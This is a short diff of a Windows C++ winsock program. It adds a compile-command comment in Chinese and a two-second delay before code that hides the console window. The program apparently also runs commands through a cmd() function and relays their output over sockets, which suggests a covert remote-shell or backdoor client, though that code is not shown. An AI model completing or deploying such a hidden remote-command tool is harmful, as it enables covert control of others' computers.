@@ -1,7 +1,7 @@
 
 #include<iostream>
 #include<winsock.h>
-
+//mingw编译命令 g++ -o xxx.exe xxx.cpp -lws2_32
 #define MSG_LENN 5120
 using namespace std;
 int cmd(char *cmdStr, char *message)
@@ -63,7 +63,8 @@ int cmd(char *cmdStr, char *message)
 }
 
 int main() {
-    ShowWindow(GetForegroundWindow(),0);
+	Sleep(2000);//需要延迟，不然会报错
+	ShowWindow(GetForegroundWindow(),0);
 	//定义长度变量
 	int send_len=0,recv_len=0,len=0;
 	//定义发送缓冲区和接受缓冲区
